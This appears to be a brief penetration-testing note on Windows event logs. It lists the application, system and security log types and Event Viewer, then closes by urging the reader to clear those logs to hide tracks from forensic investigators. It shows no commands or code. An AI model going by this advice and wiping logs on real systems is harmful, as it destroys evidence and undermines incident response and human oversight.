#### Clearing-win-logs
- Windows os stores and catalog all actions/events performed on the system and stores them in the windows event log.
- Event logs are categorized based on the type of events the store
- Application logs:Stores application/program events like startups.crashes etc.
- System logs:Stores system events like startups.reboot etc.
- Security logs:Stores security events like password changes authentication failure etc.
- Event logs can be accessed via the event viewer on windows
- The event logs are the first stop for any forensics investigator after a compromise has been detected.It is therefore very important to clear your tracks after you done with your assessment.
